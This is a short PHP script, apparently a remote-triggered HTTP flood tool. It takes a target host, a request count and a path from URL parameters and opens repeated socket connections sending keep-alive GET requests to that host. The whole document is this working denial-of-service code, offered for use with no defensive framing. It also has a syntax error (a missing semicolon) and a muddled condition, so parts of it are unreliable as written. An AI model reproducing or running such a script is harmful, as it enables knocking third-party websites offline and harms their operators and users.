<?php
if(!$_GET['host'] == ''){
$site         = $_GET['host'];
$sayi         = $_GET['time'];
$path         = $_GET['dizin']
for( $i = 0;$i <$sayi;$i++){
$fp = fsockopen( $site,80,$errno,$errstr,30 );
if( $fp )
{
$out  = 'GET /'.$path." HTTP/1.1
";
$out .= 'Host: '.$site."
";
$out .= "Keep-Alive: 300
";
$out .= "Connection: keep-alive

";
fwrite( $fp,$out );
fclose( $fp );
}
}
}
?>

